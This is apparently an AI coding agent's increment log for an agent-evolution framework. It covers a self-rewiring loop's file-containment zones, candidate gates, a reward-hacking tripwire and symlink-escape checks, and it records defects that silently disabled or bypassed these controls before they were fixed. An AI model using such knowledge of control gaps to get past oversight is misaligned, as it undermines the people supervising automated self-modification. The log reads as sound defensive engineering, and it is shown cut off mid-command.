`test_run_adopt_is_idempotent_on_second_run` goes 15 → 16 on both counts.
That pin is what makes "adopt quietly started writing something" a failure
rather than a discovery, so it was edited by hand and not relaxed.

**Mutations** (66-test baseline, each reverted from a byte-identical backup):

```
BASELINE                                                    66 passed
M1  run_adopt writes no .gitignore                           6 failed
M2  render_gitignore drops __pycache__/ and *.py[cod]        3 failed
M3  gitignore_gaps always returns ()                         2 failed
M4  gitignore_gaps uses a naive `"__pycache__" in text`      1 failed
M5  the checklist names `src/` instead of DEFAULT_AGENT_ROOT 1 failed
M7  the CLAUDE.md Zone A section is deleted                  1 failed
REVERTED                                                    66 passed
```

**Two attempted mutations survived and are recorded rather than hidden.**
Editing only the checklist item's first f-string fragment, and renaming only
the CLAUDE.md heading, each left every asserted string intact — correct
non-detections, because a partial edit is not a deletion. M5 and M7 are the
versions that remove the information.

**Green bar:** `pytest -q` 1885 passed, 1 skipped (ADR 0139 recorded 1877/1
— **+8, none removed**); `mypy aef examples` clean on 129 files;
`ruff check .` clean; `ruff format --check aef tests examples` 239 formatted.
**Zero model calls.**

**Deliberately left.** `gitignore_gaps` is a textual floor: an adopter using
`agents/**/*.pyc` or a global `core.excludesFile` is told about a gap they do
not have. The failure direction is a redundant checklist line rather than a
spent drift budget, which is the right way round, but it is a false positive
and it is not proved absent — `git check-ignore` would answer exactly and
needs a repo and a subprocess in a path that today runs against a bare
directory. And the generated `.gitignore` is written for a Python adoptee: a
Zone A carrying `node_modules/`, `target/` or `dist/` gets nothing for it,
and the same arithmetic applies with a bigger numerator.

---

## Fix wave D — the obligation and the guards (ADR 0141)

**Planted.** A seam hunt of the K1/K2 merge (`c2d14b1`) returned eight
reproduced defects across the sixth preflight obligation, the kill switch and
the corpus guards, plus one suspected item. Two of them make sentences in ADRs
0137 and 0138 false as written.

**Measured — every finding by running a command before touching anything.**

| # | Before | After |
|---|---|---|
| R9 | `import psycopg2` in a reachable module → `(False, 'db.py:1 imports psycopg2 (+2 more)')`, permanently unmeetable | `(True, '2 reachable module(s), none imports a model SDK')`; constraint #3 still sees all three |
| R4 | fix = `aef migrate --dir . --force`; running it regenerates the identical wrapper, obligation byte-identically red | fix quotes migrate's own refusal, says it **will not fix this and will loop**, names both edits including deleting the import |
| R5 | halted loop, `--state` → exit 2, corpus 0; **no `--state` → exit 0, corpus 2** | exit 2 / exit 1, corpus 0 both ways |
| R6 | bootstrap 12 then harvest 3 → `promoted 0, 3 held back by the daily rate limit`, exit 0 | `promoted 3`, and the held-back line now carries its arithmetic and what did not count |
| R7 | `loop doctor` exit 1 (obligation 6 red) → `loop cycle` proposes and gates the same repo | same behaviour, deliberately, and now stated: `preflight: 5 of 6 obligation(s) unmet ... ADVISORY` |
| R8 | documented adoption path (no `aef_migrated.py`) → `aef doctor` says nothing about `agents/mine/vendor_helper.py` importing `anthropic` | `[WARN] model_calls_visible:agents/mine/graph.py: ...vendor_helper.py:2 imports anthropic` |
| R12 | delete the two failing scenarios → `loop score` 0.6667 → 1.0000, exit 0, nothing complains | `error: corpus shrank: 2 previously-admitted scenario(s) are gone` |
| SUS | `error: malformed scenario payload: 'graph_id'` — no file named, exit 1 from `main()`'s catch-all | `error: .../train/broken.json: malformed scenario payload: 'graph_id'`, this command's own rejection code |

**Changed.** `scan_*` take `roots` and the obligation passes `MODEL_SDK_ROOTS`
(14 of 19 constraint-#3 names are not model SDKs). `preflight` reads migrate's
`UNROUTED wrapper for ... / Not routed because ...` docstring back to choose
between two fix messages. `aef loop bootstrap` requires one of
`--state`/`--no-loop-state`. `Scenario.source` rides on the scenario and only
`harvest` is charged against `daily_limit`. `Preflight.render()`, the module
docstring and `cmd_cycle`/`cmd_gate` say what is true about who reads `ready`.
`aef doctor` keys the advisory on the graph and gains `--agent-path`.
`save_scenario` writes the never-shrinks ledger and `_preflight`/`cmd_score`
read it.

**The decision on R7, because it is the one a reader will want argued.** Left
ADVISORY, not made blocking. A refusal could live only in the CLI — obligation 4
is knowable only there, deliberately (`_halt_notifier`) — so the importable
`harness.loop.cycle()` would stay unguarded and ADR 0137's sentence would still
be false. Three of the six enforce themselves later anyway. And it would refuse
`READY_LOOP.md` K3's own first-day sequence, where production observations
cannot exist yet. Strengthening five long-advisory controls is an owner's
decision, not a fix wave's side effect — so the wave says it loudly and leaves
the decision available.

**Mutation.** 13 planted, 13 caught, `git diff --exit-code` clean afterwards.
The two worth naming: M1 (obligation 6 back on the default list) failed 15
tests, because the behavioural sweep over all 14 non-model vendors and the AST
caller-pin both fire; M12 (manifest regenerated from disk rather than unioned)
failed 2, and would otherwise have made the never-shrinks ledger forget exactly
the scenario that had just been deleted.

**Green bar.** `pytest -q` 1918 passed, 1 skipped (from 1875; +43, none
removed). `mypy aef examples` 129 files clean. `ruff check .` clean.
`ruff format --check` 239 files formatted. **No rubric dimension moves**, and no
live model call was made.

**Deliberately left.** R12's baseline is read from the base ref only when the
corpus is tracked inside the repo; the working-tree fallback does not stop a
candidate that deletes a scenario and its manifest entry in one commit, and no
CI job reads either — `corpus.py`'s docstring claimed one did and is corrected
there rather than made true. A scenario written by a pre-0141 harvest inside the
same 24 hours is not charged against the limit; that window closes on the first
harvest under this version. `aef doctor`'s discovery names the three entries the
adoption contract names and will miss a graph kept elsewhere, which is what
`--agent-path` is for. And nothing here ran against a repo nobody wrote to be
scanned — K5's whole point, still.

---

## L1 + L2 — `aef migrate` writes into Zone A, and wires the loop (ADR 0143)

**Planted.** ADR 0139 (K3) measured four things that make `aef loop cycle`
exit 0 having done nothing in a freshly adopted repo. Two of them are
properties of what `aef migrate` itself writes, and both had been reported
and left: L1 outside K3's file scope, then again in fix wave E (ADR 0142),
which could only change what `aef adopt` *says* because `migrate.py` had
another owner that night. One worker, because both live in one file.

**Reproduced, by RUNNING, before anything changed.**

L1 — the generated file is in the one tree the loop is forbidden to touch,
and the report is silent about it. Fresh `git init`, one raw-SDK agent,
`aef adopt`, `aef migrate --dir .`, then a real candidate commit through the
harness's own `inspect_candidate`:

```
wrote .../l1repo/aef_migrated.py                                    EXIT=0
files matching *.py at the repo ROOT: ['aef_adapter.py', 'aef_migrated.py']
does agents/migrated/graph.py exist?  False

$ inspect_candidate(repo, base, loop/candidate)
  changed paths: ('aef_migrated.py',)
  allowed: False
  REJECT: aef_migrated.py: Zone C (core) — not under the agent root 'agents';
          only Zone A is agent-writable
```

L2 — one node, routed to `END`, so nothing ever writes failure memory:

```
$ build_graph() from the generated module
  nodes : ['src_my_agent__run_agent']   edges : []
  return StateDelta(working_memory={key: result.content}), END
  "reflect" appears in the generated source: False

$ aef run aef_migrated --memory <state>/memory.jsonl
  memory.jsonl exists: False

$ aef loop cycle --memory <state>/memory.jsonl
  ledger verified: 0 entr(ies)
  no admissible failure memory: no candidate this cycle             EXIT=0
```

**Changed.** `run_migrate` takes `--out`, threaded from `aef/cli/main.py`,
defaulting to `DEFAULT_MIGRATED_OUT = f"{DEFAULT_AGENT_ROOT}/migrated/graph.py"`
— a module-level constant every other surface **imports** rather than
re-derives. Parents are created; ADR 0140's never-overwrite and `--force`
`.bak` rules follow the path rather than one filename; `report()` names the
**zone** of what it wrote, answered by `zones.inspect_path` — the classifier
G0 itself uses — so writing into Zone C is still possible and is still costed
in the gate's own words at the moment of writing. `LEGACY_MIGRATED_OUT` keeps
`aef doctor` discovering a repo migrated before this. The generated
`build_graph()` wires `<call site> -> reflect -> consolidate -> END`, every
node's route moving from `END` to `"reflect"`.

**Measured.**

| | before | after |
|---|---|---|
| zone of the written path | `Zone C (core) — not under the agent root 'agents'`, `allowed: False` | `Zone A (agent-writable)`, `allowed: True` |
| the report on that | silent | `Zone A (agents/**) — agent-writable, the only tree the self-rewiring loop may propose changes to` |
| memory after one run of the generated graph | **0 records** | **1 record** (`kinds=['success']`) |
| the caller's answer in `working_memory` | `'a stubbed answer'` | `'a stubbed answer'` — unchanged, byte for byte |
| a hand-built bare `Services(model_provider=...)` | runs | `ServiceNotConfiguredError: service 'critic'` |
| `__init__.py` needed for `import agents.migrated.graph` | — | **none**, in all five layouts built and imported |

**L2's falsification clause, honoured with a measurement rather than an
argument.** The node's return to the caller does not change. What changes is
that reflect needs `critic`/`judge`/`memory` and consolidate needs
`knowledge`; `agent_services()` defaults all four, so `aef run`,
`aef loop bootstrap`, `aef loop cycle` and every gate re-execution are
unaffected, and the K3 sequence runs unchanged. A caller who hand-builds
`Services` breaks. Trade taken — a generator whose whole output is inert in
the system it generates for is worse — stated in the generated module
docstring, in `build_graph`'s docstring and in the CLI report, and pinned by
a test on both halves. No test pinned a single-node generated graph.

**K3's end-to-end test now gates migrate's OWN output.** Deleted: the
hand-placed `agents/mine/graph.py`, its `make_reflect_node`, its `Edge`, its
`"reflect"` routes, and the two hand-written `__init__.py` files — the test
writes no edge, no reflect node and no route anywhere. Kept: the two
module-level numeric constants (item 2 — a generated wrapper has no number of
its own to invent) and a body that can fail without a credential (item 4 —
this sequence has no credential), patched into migrate's output with
before/after assertions on every substitution; plus the failing
`aef run --memory`, the tripwire line run verbatim, `bless`, `doctor`,
`--entrypoint`, and the smoke test G1 builds against. Step 2 is unchanged:
bootstrapping the migrated model-calling graph still exits 1 with `no live
provider to fall through to`, which is *why* the body must be replaced.

The gate assertions were **strengthened, not relaxed** — the rejection is
read from `ledger.jsonl` (`rejected` present, `accepted` absent,
`gates["G3"]["outcome"] == "fail"`) rather than from the CLI line, because a
test demanding an acceptance could be satisfied by weakening G3. Its run:

```
GATED summary: ran G0, G1, G4, G5, G2, G3; passed=False
  G0 pass  1 file(s), 28 line(s), all Zone A, no static-safety violations
  G5 pass  drift 0.098/0.500 from the blessed baseline
  G2 pass  5 scenario(s) re-executed; every previously-passing one still passes.
  G3 fail  candidate does not beat the p95 of the random control cohort
evidence: 1 candidate + 1 incumbent + 5 random control(s); corpus records one
          graph ('adoptee'); gating all 5 gated scenario(s)
```

`G0 pass ... all Zone A` is L1's whole point, delivered by the gate rather
than asserted by the test.

**Mutations** — 11 planted, 11 caught, each reverted from a byte-identical
backup verified with `shasum` (never `git checkout --`):

```
BASELINE                                                    149 passed
M1  the default output goes back to the repo root             6 failed
M2  --out is accepted and ignored                             4 failed
M3  parent directories are no longer created                 11 failed, 2 errors
M4  report() stops naming the zone                            4 failed
M5  the routed node routes to END again                       4 failed
M6  build_graph drops the reflect/consolidate tail            6 failed
M7  doctor stops discovering migrate's output                 3 failed
M8  doctor forgets the pre-0143 output path                   3 failed
M9  the generated docstring drops the silent-failure warning  1 failed
M10 LOOP.md claims migrate writes none of the four            1 failed
M11 the checklist stops naming migrate's output path          1 failed
REVERTED                                                    149 passed
```

**A defect found on the way, fixed.** The generated `LOOP.md` still said
"Add `__pycache__/` to `.gitignore` before you bless. `aef adopt` does not
write one" — five hours after ADR 0142 made it write one. Corrected to what
is true and still matters: adopt writes one, **skips an existing
`.gitignore` rather than appending**, so a repo that already had one may still
be missing the pattern. The measured drift numbers and their test pin stay.

**Wrong predictions, recorded as wrong.** (1) I expected the generated
packages to need `__init__.py`; five layouts were built and imported and none
did. (2) I expected K3's hand-written agent to disappear entirely; it does
not — L1 and L2 remove *placement* and *wiring*, and items 2 and 4 of the
measured minimum are semantics, so definition-of-done statement 1 is still
not true. (3) I expected wiring reflect to be free; it moves four services
from optional to required for a hand-built `Services`.

**Green bar.** `pytest -q` **1960 passed, 1 skipped** (from 1945/1; **+15**,
none removed — all 15 in `tests/cli/test_migrate.py`, 41 → 56).
`mypy aef examples` 129 source files, no issues. `ruff check .` all checks
passed. `ruff format --check aef tests examples` 239 files already formatted.
**No rubric dimension moves — the score stays 86. Zero model calls.**

**Deliberately left.** `aef loop bless` is still wrong in the way K3 reported
— it checks `path_exists_at(ref, agent_path)` and then archives the Zone A
tree, two different questions — and L1 only makes that harder to reach; that
is L5, in another worker's file. With more than one call site, every generated
node routes to `reflect` and gets an edge but only the entry node is reached,
exactly as before this change when `edges=[]` left them unreachable too; the
generated docstring now says so out loud rather than leaving it to be found.
And the K3 test's patched copy of the generated file carries two now-unused
imports, because it replaces the body and not the header — harmless, since G1
runs `pytest` rather than `ruff`, and named here rather than discovered later.

---

## L3 + L5 — bootstrap leaves the evidence, bless archives the agent (ADRs 0145, 0147)

**Planted.** Two of the four steps `INGEST_LOOP.md` moved from the adopter's
lap into the tools, in one worker because both are `aef/cli/loop.py`. L3:
`aef loop bootstrap` gains `--memory` and a `--config` that reads `aef.yaml`
through `aef run`'s own code path. L5: `aef loop bless` refuses when the agent
is not inside the tree it would archive.

**Reproduced first, all three, by running commands against a fresh repo.**

| # | Before |
|---|---|
| L3a | bootstrap runs 4 inputs, prints `2 of 4 recorded run(s) FAILED.`, writes **no** memory file; `aef loop cycle --memory M` then prints `no admissible failure memory: no candidate this cycle`, **exit 0** |
| L3b | bootstrap on a model-calling graph: `ModelProviderError: cassette miss ... and no live provider to fall through to` × 4, `NOTHING was recorded`, exit 1 — and `--config`, the flag that fixes it, had been in the parser since ADR 0138 with nothing pointing at it |
| L5 | `bless --agent-path aef_migrated.py` → `blessed aef_migrated.py as baseline v1`, exit 0, archive contents: `agents/README.md`, one file |

**Measured.** Same sequence, one flag added, nothing else hand-written — no
`aef run --memory`, no hand-written scenario:

```
$ aef loop bootstrap agents.mine.graph --corpus corpus --inputs inputs.json \
      --no-loop-state --memory state/memory.jsonl
2 of 4 recorded run(s) FAILED.
  4 memory record(s) written to the durable store — what the graph's own
  reflect node observed, nothing bootstrap decided.
$ <the tripwire line it printed, verbatim>      recorded ... (validation)
$ aef loop bless ... --agent-path agents/mine/graph.py    baseline v1
$ aef loop cycle ... --memory state/memory.jsonl
  proposed cycle-20260904T154639-0 on local branch loop/cycle-...
  gated: reject — G3 rejected it: candidate does not beat the p95 of the
    random control cohort — this is the null hypothesis, not an improvement
```

`no admissible failure memory` → a proposed and gated candidate. The verdict
is a **rejection** and that is the assertion: G3 measuring against a real
control cohort is the gate working (ADR 0139's rule).

And L5, after: `error: aef_migrated.py exists at HEAD but is NOT inside the
tree this would archive: 'agents' at HEAD holds 1 file(s) (agents/README.md).
...` — exit 1, archive empty.

**Changed.** `RunScopedMemory` (reads from a fresh per-input scratch store,
writes mirrored to a durable sink) so ADR 0138's isolation seam and ADR 0139's
requirement 4 both hold — the shared-store implementation would have satisfied
the cycle and made every scenario order-dependent. `bootstrap()`'s factory
takes the store rather than choosing it. `aef/cli/run.py` gains `RunConfig` /
`build_run_config`, which `cmd_bootstrap` now reads instead of building its
own provider — that second construction site had been silently dropping
`policies`, `tools.allow` and `evaluator.suites` from every recording.
`BootstrapOutcome` reports the live calls the recording spent and, when the
graph asked a model with no provider, names `--config`. `preflight.bless`
refuses on containment, naming both paths. `DEFAULT_AGENT_PATH` is built from
`DEFAULT_AGENT_ROOT`.

**A second defect, found while closing the first.** `--config` was not
missing; it was unreachable-by-documentation *and* wired to a private copy of
`aef run`'s config reading. ADR 0139 concluded "a model-calling graph cannot
get its first corpus" with the flag sitting in the parser — a flag nobody is
pointed at is not a feature.

**Mutation.** 10 planted, 10 caught, every one restored from a backup whose
SHA-1 was checked before and after (`git checkout --` would have destroyed
uncommitted work). The one worth naming is M2 — reads fall through to the
sink, which is durable AND wrong — because it is the implementation this
increment was most likely to have shipped; it fails
`test_isolation_survives_the_durable_sink`.

**Green bar.** `pytest -q` 1960 passed, 1 skipped (from 1945; **+15, none
removed**). `mypy aef examples` 129 files clean. `ruff check .` clean.
`ruff format --check aef tests examples` 239 formatted. **No rubric dimension
moves** — adoption readiness is not a scoring claim. **Zero live model calls.**

**Deliberately left.** The live recording path is **untested**: all three
shipped provider impls make real calls and there was no quota, so `--config`
is proved with a fake provider substituted at `aef.cli.run`'s own import —
the wiring, the cassette and the count, not the credential. An errored input's
model calls are not counted, because the recording cassette dies with the
exception. The generated `LOOP.md` and ADR 0139 still say bootstrap cannot
supply the failing run's memory; that sentence is now false and belongs to
L6's first-day document, not to this file. And nothing here ran against a repo
nobody wrote to be scanned.

---

## L6 — the first-day document, written from a terminal (ADR 0148)

**Planted.** `FIRST_DAY.md`, shipped by `aef adopt` under the never-overwrite
rule and added to `tests/test_prompt_surface.py`'s surface. It is the only
document in the kit that answers **when**: `CLAUDE.md`, `AGENT_INTEGRATION.md`,
`LOOP.md` and `AUTONOMY.md` each describe a part, and none of them said "today,
in this order, and here is what each step costs". Seven sections — what `adopt`
gives and explicitly does not; `migrate`'s two forms and **if your function
keeps its own client, the gates cannot replay it**; `bootstrap` with `--memory`
and `--config`; the owner's tripwire line; `bless` + `doctor` and that the six
obligations are **advisory, not gating**; `cycle` and the one requirement still
the adopter's; what still needs a person.

**The rule, and why.** Every command in it was **RUN in a scratch repo and its
real output pasted**. Three documents in this scaffold have told adopters
things that were false, and every one was written from the source: `LOOP.md`
said adopt writes no `.gitignore` five hours after it did; ADR 0139 concluded a
model-calling graph "cannot get its first corpus" while `--config` sat in the
parser; the obligation's fix string sent adopters round a loop.

**Nine already-false claims, each closed by running the command.**

| Where | Ran |
|---|---|
| root `AGENT_INTEGRATION.md`: adopt "writes six never-overwrite files" | it wrote **16** (17 now) |
| generated `AGENT_INTEGRATION.md`: "the loop to **five** green", `model calls visible` missing from the list | `Loop readiness — 6 things you must supply` |
| same: "with obligations unmet the gates refuse for lack of evidence" | `ADVISORY — this command does not refuse on them`, and the cycle gated a candidate |
| `LOOP.md` item 4: "`aef loop bootstrap` cannot do this for you" | `bootstrap --memory` wrote 4 records; without it, no file and `no admissible failure memory`, **exit 0** |
| `LOOP.md`'s sequence: `aef loop bootstrap <m> --corpus corpus --inputs inputs.json` | **exit 1** — one of `--state`/`--no-loop-state` is required |
| `LOOP.md`: the model-calling paragraph never named `--config` | the command's own error names it; the document did not |
| `LOOP.md`: "work down its output until every line is OK" | two obligations cannot be green on day one |
| `aef.yaml` + `AGENT_INTEGRATION.md`: `--config` reaches run/gate/cycle | and `bootstrap`, since ADR 0145 |
| generated `aef_adapter.py`: `services or Services()` | `ServiceNotConfiguredError: service 'critic'` on the documented path |

The last is the seam this wave opened and nobody closed: L2 wired
`reflect -> consolidate` into the graph the checklist tells the adopter to
point the shim at, and the shim was the only bare `Services()` that ships.
Fixed to `agent_services()`; the regression test **executes** the shim, because
an assertion that the source names `agent_services` passes on a shim that
imports it and never calls it.

**Measured, and it changes what the minimum means.** ADR 0139 measured
requirement 2 (a module-level numeric constant) on a hand-written agent and got
`the proposer produced nothing from the available evidence`. Re-run on
**migrate's own generated graph** — the shape adopters now have — a candidate
**is** proposed (`add_bounded_retry` applies to the failing node's body and
writes its own `RETRY_ATTEMPTS = 3`), and the **control cohort** is what
collapses: `cannot build a control cohort ...: no module-level numeric
constants to mutate, so there is no null hypothesis to draw from`. Same
requirement, different reason, different message. So `FIRST_DAY.md` says the
constant is needed by the cohort at least as much as by the proposer, and that
whether `--proposer llm` needs one is **unmeasured and blocked on quota** (L4)
— because whatever proposes the candidate, the thing that judges it is built by
mutating constants.

**Mutation. 10 planted, 10 caught — after three MISSED on the first pass.**
M4, M6 and M7 each perturbed a heading while the asserted token survived
elsewhere in the document (`--config` in another paragraph, "the gates cannot
replay it" in prose, "unmeasured" in the preamble). Three tests were pinning
**tokens rather than claims** — the exact way a documentation test goes green
on a document that no longer says the thing. Strengthened to the load-bearing
sentence; then 10/10. Every restore was from a byte-identical backup with its
SHA-1 checked before and after.

**Green bar.** `pytest -q` **1985 passed, 1 skipped** (collected 1976 → 1986;
**+10, none removed**). `mypy aef examples` 129 files clean. `ruff check .`
clean. `ruff format --check aef tests examples` 239 formatted. **No rubric
dimension moves — the score stays 86. Zero model calls.**
`tests/cli/test_adopt.py`'s pinned written-file set and idempotency counts went
16 → 17 **deliberately**, with the reason beside them.

**A defect found and not fixed** (`aef/harness/loop.py`, outside this
increment's files): when the control cohort cannot be built, the cycle's
summary line reads `G2 rejected it: gate raised TrustBoundaryError: scratch
destination .../workspace must be empty` — a scratch-directory red herring for
a missing constant. The real reason is in the ledger's `evidence` note.
Reproduced twice, on a copied repo and on one built from `git init` upward.

**Deliberately left.** The live `--config` recording pass has still never been
executed by anyone — no quota — and `FIRST_DAY.md` says that in those words
rather than implying otherwise. Definition-of-done statement 1 is false by
exactly one item, the module-level constant, which is a node's semantics and
not plumbing. And nothing here ran against a repo this project did not write.

---

## Fix wave F — the recorder, the defaults, and the tree that is not there (ADR 0149)

Five seams on the adoption path, from a hunt over `record`, `bootstrap`,
`bless`, `migrate` and `cycle`. Every one reproduced by RUNNING a command
before anything was changed.

**F1, and it silently disabled the reward-hacking control.** `aef loop record
--config` had its own `load_agent_config` + `build_model_provider` and passed
`agent_services` **no policy**, while `cmd_bootstrap` — two functions below it
in the same file, same flag, same comment — went through `build_run_config`.
Same graph, same `aef.yaml`, same objective: bootstrap recorded
`{'decision': 'allow'} done`, record recorded `{'decision': 'deny'} failed`.
`aef loop record --expected must_fail` is the ONLY documented way to mint a
tripwire, and its guard — which refuses the label when the agent completes the
task — ACCEPTED it, because the run had failed from the dropped config rather
than from the task being beyond the agent. `scenario_runner` applies the
owner's policy at gate time, so the same scenario then passes:
`tripwire_hit = True`, `regressed = True`, and G2 rejects every candidate
forever reporting reward hacking. Carried all the way through the gates' own
`run_scenario` and `Comparison`, not inferred. `cmd_record` and `cmd_score`
now read config through `aef run`'s single site; the ADR 0145 AST test is
generalised over **every** `--config` command the PARSER declares, because a
hand-kept list is exactly how it passed for `bootstrap` while `record`
drifted; and the behavioural test the hunt said was missing — record the same
input through both recorders, compare the scenarios — now exists.

**F2 — the default `--agent-path` was aef-core's own fixture directory.** ADR
0147 said it had rebuilt `DEFAULT_AGENT_PATH` from `DEFAULT_AGENT_ROOT`; it
rebuilt the root and kept the `demo`, and `harness/loop.py::cycle` hardcoded
the whole literal separately. On a defaults-only `adopt` + `migrate` repo,
`loop doctor` printed `fix: aef loop bless ... --agent-path
agents/demo/graph.py` (which exits 1) and `loop cycle` exited **0** with
`no agent source at agents/demo/graph.py in main: no candidate` — ADR 0139's
silently-inert shape from the documented defaults. One constant now, in
`harness/zones.py` (not `cli/migrate.py`: the harness does not import the
CLI), derived from what `aef migrate` writes, with `DEFAULT_MIGRATED_OUT`
aliased to it. Guarded by an AST scan that catches the **interpolated** form,
because that is the shape the defect took.

**F5 — `bless` accepted a Zone A symlink** and archived 16 bytes of
`../real/graph.py` as the baseline, so G5 measured drift against a tree
holding the agent by name and none of it by content. This is the case ADR
0147's own Confidence section named untested. Refused now, reusing
`candidate.ESCAPE_MODES` — the list that already treats the same thing as a
security event when a candidate ADDS one — rather than writing a second one.

**F6 — three call sites, one reachable node, and nothing said so.** The
executor emits no warning for a declared-but-unreachable node, `classify()`
builds `node_path` from the trace so G2 never sees them, and the report's
sentence was singular for any number of sites. The REPORT is fixed, not the
graph: it names the entry node, lists every unreached one, and says composing
them is the semantic half migrate will not do. No edge order invented — how
call sites compose is not in the source, and a guessed order would be silently
wrong.

**F7 — which error `build_run_config` reports first** changed when it was
extracted (ADR 0145), evaluator before provider where `aef run` had provider
first. Kept and PINNED — validate before constructing — with a control that
the second fault is still reachable. A decision now rather than whichever
statement a refactor left on top.

**Mutation.** 11 planted, 10 caught, each restored from a backup whose SHA-1
was checked before and after. Two worth naming. M2 leaves `build_run_config`
in place and drops only `policy=`: the AST test passes and both behavioural
tests fail, which is why the behavioural comparison had to exist. **M4a was
MISSED and should be** — renaming the single constant makes everything point
at the same wrong place *consistently*, and the defect was two constants for
one fact, not the string; M4b forks the writer into a second derivation and is
caught. Reported rather than dropped: a mutation round that lists only its
successes is not evidence.

**Green bar.** `pytest -q` 1973 passed, 17 skipped (1990 collected, from 1976;
**+14, none removed** — baseline read by exporting HEAD with `git archive` and
collecting there, not asserted). `mypy aef examples` 129 files clean. `ruff
check .` clean. `ruff format --check aef tests examples` 241 formatted. **No
rubric score moves.** **Zero live model calls.**

**Errata appended** to ADR 0145 (its "one construction site, two commands"
covered one of two callers, and the corpus consequence it states was true of
every `record`-made tripwire the day it shipped) and ADR 0147 (its "last
hardcoded literal" claim, and its untested symlink case, now reproduced as a
failure).

**Deliberately left.** F6 fixes the report, not the graph: an adopter who
reads it and does nothing still has one reachable node. `aef loop cycle` on a
defaults-only migrated repo now reaches the proposer and produces nothing —
that is ADR 0139's requirement 2, a module-level numeric constant the
generated graph does not have, and it is not claimed as closed. Whether any
existing baseline anywhere already holds a link target, or any existing corpus
holds a policy-denied recording, is **not measured** and nothing detects
either retroactively. Every fixture here was authored by this programme.

---

## S0 / J0 — the independent score is the score (ADR 0151)

86 → **68**. Blind re-score verified on every dimension; the lower number stands per BEYOND_90's rule. Two findings became fixes tonight (no-op scheduled cycle; retrieval→prompt link). Report: `docs/research/j0-independent-score-2026-09-04.md`.

## M1 — a prompt-file agent is a graph (ADR 0152)

Increment M1 of `UPGRADE_LOOP.md`. Model: `claude-opus-5[1m]`. **No rubric
dimension moves** — adoption work claims no rubric point.

**Reproduced by running.** `aef migrate --dir .` on a copy of the marlin pilot
clone — 8 `.claude/agents/*.md` personas, 6 skills, `AGENTS.md`, `.codex/`,
already adopted:

```
scanned 38 Python file(s)
found 0 call site(s): 0 wrapped, 0 skipped

wrote .../agents/migrated/graph.py
```

Exit 0, and the file it wrote has a `build_graph()` whose body is `raise
NotImplementedError`. Every eligible repo in the 2026-09-04 survey has zero SDK
call sites, so that was the answer for all of them.

**Built.** `aef/reasoning/prompt_agent.py` —
`make_prompt_agent_node(agent_file=, agent_name=, route="reflect")`: persona
body as the `system` message, `state.objective` as the user turn, through
`services.require_model_provider().complete(...)`, reply to `working_memory`,
`deterministic=False`, `EXTERNAL_CALL`, idempotency key from (agent name,
objective). The persona is read **at execution time**, never copied into the
generated module, so an edit to the `.md` changes the next run. **The prompt
runs; the agent's tools do not** (`--tools ""`, `--max-turns 1`); the persona's
`tools:` frontmatter is parsed, reported and never obeyed.

`aef migrate` gains `--agent-root` and `--prompt-agents`: it discovers
`.claude/agents/**/*.md` **recursively** and writes one graph per agent at
`<agent-root>/migrated/<module>/graph.py`, `graph_id` = the persona name, wired
`prompt_agent → reflect → consolidate → END`. Skills are found, counted and
deliberately NOT migrated, with the reason in the report — a `SKILL.md` is
instructions injected into a session already in progress, points at bundled
files a tool-less completion cannot open, and has no objective of its own.

**Zone A: design (a), and the count that chose it.** `--agent-root
.claude/agents` puts the graphs beside the personas and the personas in Zone A.
Chosen over a multi-root `ZonePolicy` because it changes **no
containment-boundary code at all** — `zones.py`, `candidate.py`, `preflight.py`,
`workspace.py`, `trust.py`, `gates/base.py` and `aef/cli/loop.py`'s existing
`--agent-root` are untouched; (b) would have changed all of them plus the test
pinning `ZonePolicy`'s single field. Opt-in, default `agents` unchanged, and
migrate's report states the blast radius in words either way.

**Two CLI facts measured, not assumed, at zero model cost.** `claude -p --agent
<unknown>` is rejected before any model call and names every agent the CLI
found. With `.claude/agents/probe-one.md`, `.claude/agents/sub/probe-two.md` and
`.claude/agents/migrated/probe_one/graph.py` on disk it listed `probe-one,
probe-two` and nothing from the `.py` — so discovery recurses, and a `.py` under
`.claude/agents` is inert to the harness.

**G0 on a `.md` in Zone A — ran it.** It did not crash. It *skipped silently*:
`pass ... all Zone A, no static-safety violations` over a candidate whose only
file `_scan` never opened. It now counts the Python files it scanned and names
the ones it did not, as evidence. Nothing loosened — a `.py` beside the `.md` is
still scanned and still rejected for a forbidden import.

**Measured, 4 live calls (budget ≤ 6).** Quota preflight OK (`input_tokens: 2`).
`aef migrate` on the clone: 8 agents found, 8 graphs written, 6 skills named, 0
call sites. `aef run agents.migrated.marlin_accela.graph --config aef.yaml`
returned real persona-grounded text with the reflect tail run. `aef loop
bootstrap` on two inputs recorded 2 scenarios, each `graph_id: marlin-accela`
with a one-entry cassette carrying the persona as its system message.

**Mutation-checked, five for five**, each restored byte-identical against a
`shasum -a 256` taken before the edit: drop the system message → 3 tests fail;
`rglob` → `glob` → the subdirectory test fails; G0 stops naming unscanned files →
2 tests fail; no module sanitisation → 2 tests fail; idempotency key drops the
agent name → 1 test fails. The ruff-on-generated-output test caught a real
defect on first run: seven `E501`s where the repo name plus the persona name
pushed the generated docstring's first line past 100 columns.

**Green bar.** `pytest -q` **2039 passed, 3 skipped** (2042 collected, from a
baseline of **2002** read by exporting HEAD with `git archive` and collecting
there rather than asserted — **+40, none removed**). `mypy aef examples` 130
files clean. `ruff check .` clean. `ruff format --check aef tests examples` 246
formatted.

**One flake, pre-existing.** `tests/harness/test_container_sandbox.py::
test_a_timed_out_container_is_actually_dead` failed once under full-suite load
and passed on its own (25 passed) and in an earlier full run of the same tree.
A container-timeout race, untouched by this increment; reported rather than
re-run until green and left unmentioned.

**Defect found outside this increment's files, reported not fixed.**
`ClaudeCodeProvider.complete` takes `answered_by = next(iter(model_usage),
None)` — the first key of the CLI's `modelUsage` map. With `--model
claude-opus-5` passed, that key was `claude-haiku-4-5-20251001` (a helper model
the CLI bills alongside the requested one), so the run's provenance and the
recorded corpus name the wrong model. `aef/providers/` is M3's.

**Deliberately left.** The `aef.yaml` binding for the widened agent root: the
opt-in surface today is the `--agent-root` flag, because `aef/config/` is held
by another worker this wave. `CLAUDE.md`'s "narrower and honest pitch"
paragraph is untouched — M5 replaces it when the acceptance test passes. The
corpus this increment recorded has **no failing input**, so nothing here shows a
changed prompt surviving the gates; that is M4/M5.

---

## J0F — the scheduled loop that ran every night and did nothing (ADR 0165)

**Branch:** `upgrade/j0f-scheduled-cycle`, off `d1de68c`.
**Rubric claim:** none. Dimension 1 is J0's to re-earn and this earns half of
one of its three findings; the ADR says so and says what would earn the rest.

**Reproduce (RUN, before any change).** This repo's own
`.github/workflows/loop-monitor.yml`, nightly, with its own flags:

```
$ aef loop cycle --repo . --state <s>/state --workdir <s>/work \
